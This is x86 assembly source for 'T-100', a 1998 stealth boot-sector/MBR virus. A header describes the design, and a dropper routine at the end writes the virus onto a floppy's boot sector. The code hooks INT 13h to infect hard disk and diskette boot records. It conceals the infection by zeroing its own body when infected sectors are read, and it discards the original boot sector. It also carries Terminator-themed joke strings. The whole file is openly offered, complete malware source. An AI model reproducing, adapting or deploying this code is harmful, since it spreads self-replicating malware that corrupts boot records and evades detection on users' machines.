;============================================================================
;
;
;    NAME: T-100 v1.00
;    TYPE: "Stealth" bootsector/MBR infector.
;  AUTHOR: T-2000 / [Invaders].
;    DATE: July - August 1998.
;  STATUS: Research, lame.
;  RATING: 50%
;
;
; This is a experimental virus, it will probably never take off in the wild.
; It was inspired by the Da'Boys boot-virus, I also wanted to write a virus
; that wouldn't take any space, so this is my try.
;
;
; It doesn't preserve the original bootsector/MBR of infected drives, when
; booting from a infected drive (both diskette & harddisk), it will execute
; the MS-DOS bootsector located on drive C: (track 0, head 1). All standard
; MS-DOS systems have their bootsector resided at this position.
;
;
;                         "They said they got smart..."
;                               - Terminator -
;
;============================================================================


                .MODEL  TINY
                .STACK  1024            ; For the dropper.
                .CODE


Revector        EQU     0FEh
Marker_Boot     EQU     '8H'


                JMP     Virus_Entry
                NOP


                DB      '[FiRST GENERATiON]'


                ORG     62
Virus_Entry:
                MOV     SI, 7C00h               ; Initialize some registers.
                XOR     DI, DI

                CLI                             ; Set our stack.
                MOV     SS, DI
                MOV     SP, SI
                STI

                MOV     DS, DI                  ; DS=00h.
                MOV     BX, SI

                MOV     AX, (512 / 16)          ; ES = last 512 bytes of IVT.
                MOV     ES, AX

                MOV     CX, (512 / 2) - 1       ; Copy virus to relocated.
                INC     CX                      ; - ANTI-HEURISTIC -
                CLD
                REP     MOVSW

                DB      0EAh                    ; Fixed JMPF to relocated.
                DW      OFFSET Relocated
                DW      (512 / 16)

Virus_Name      DB      '=[ T-100 (c) 1998 by me of a certain group ]='

Relocated:
                MOV     SI, 13h * 4             ; Initialize some registers.
                MOV     DI, OFFSET Int13h

                CLI                             ; Save & hook INT 13h.
                MOVSW
                MOVSW
                MOV     WORD PTR DS:[SI-4], OFFSET NewInt13h
                MOV     WORD PTR DS:[SI-2], CS
                STI

                PUSH    DS                      ; ES=00h.
                POP     ES

                MOV     AX, 0201h               ; Read MBR of 1st harddisk.
                PUSH    AX                      ; So it will be infected.
                INC     CX                      ; CX=01h.
                MOV     DX, 80h
                INT     13h

                POP     AX                      ; AX=0201h, read bootsector.
                MOV     DH, 01h
                INT     Revector

                PUSH    ES                      ; JMP to bootsector.
                PUSH    BX
                RETF


NewInt13h:
                CMP     AH, 02h                 ; Read?
                JB      JMP_Int13h

                CMP     AH, 03h                 ; Write?
                JA      JMP_Int13h

                OR      DH, DH                  ; Head zero?
                JNZ     JMP_Int13h

                CMP     CX, 01h                 ; Track zero, bootsector/MBR?
                JNE     JMP_Int13h

                INT     Revector                ; Execute function.
                JC      Do_RETF2

                CALL    Check_Infect

Do_RETF2:       RETF    2                       ; Return to caller.

JMP_Int13h:     JMP     DWORD PTR CS:Int13h     ; JMP to INT 13h-chain.

Check_Infect:
                PUSHF                           ; Save registers.
                PUSH    AX
                PUSH    BX
                PUSH    CX
                PUSH    SI
                PUSH    DI
                PUSH    DS
                PUSH    ES

                PUSH    ES                      ; DS = readbuffer.
                POP     DS

                CMP     DS:[BX.Place_Sign], Marker_Boot
                JNE     Infect_Disk

                XOR     AX, AX                  ; Place zeroes where the
                MOV     DI, BX                  ; virus resides.
                ADD     DI, 62                  ; - STEALTH -
                MOV     CL, (1BEh - 62) / 2
                CLD
                REP     STOSW

                MOV     DI, BX                  ; Also hide virus signature,
                ADD     DI, 504                 ; INT 13h address, and mark.

                STOSW
                STOSW
                STOSW

                JMP     Exit_Infect

Infect_Disk:
                XCHG    CX, AX                  ; Reset drive, (AH=00h).
                INT     Revector

                PUSH    CS
                POP     ES

                MOV     SI, BX                  ; Copy datablock into virus.
                MOV     DI, 3
                ADD     SI, DI
                MOV     CX, 59
                CLD
                REP     MOVSB

                MOV     SI, BX                  ; Copy partition-table into
                MOV     DI, 1BEh                ; our virusbody.
                ADD     SI, DI
                MOV     CL, (504 - 1BEh) / 2
                CLD
                REP     MOVSW

                MOV     AX, 0301h               ; Write infected bootsector.
                XOR     BX, BX
                INC     CX                      ; CX=01h.
                INT     Revector

Exit_Infect:    POP     ES                      ; Restore registers.
                POP     DS
                POP     DI
                POP     SI
                POP     CX
                POP     BX
                POP     AX
                POPF

                RETN


                DB      '[T-100] stainless steel prototype', 0

                DB      'Manufactured by Cyberdyne Systems, '
                DB      'Los Angeles - 2016.', 0

                DB      'MISSION OBJECTIVE: Termination of '
                DB      'senator Johnson.', 0


                ORG     504

Int13h          DW      0, 0
Place_Sign      DW      Marker_Boot
                DW      0AA55h

;-------------[ END ]--------------------------------------------------------


; Dropper, installs the virus on the drive A: bootsector.

START:
                PUSH    CS
                POP     DS

                PUSH    CS
                POP     ES

                MOV     BP, 4

Try_Again:      DEC     BP
                JZ      Exit

                XOR     AH, AH                  ; Reset drive A:
                CWD
                INT     13h

                MOV     AX, 0301h               ; Overwrite bootsector with
                XOR     BX, BX                  ; our virus.
                MOV     CX, 01h
                INT     13h
                JC      Try_Again

                MOV     AH, 09h                 ; Display message.
                MOV     DX, OFFSET Warning_Msg
                INT     21h

Exit:           MOV     AX, 4C00h               ; Exit to DOS (yeah rite!).
                INT     21h

Warning_Msg     DB      'WARNING: Infected drive A: with T-100 virus!'
                DB      0Ah, 0Dh, '$'

                END     START
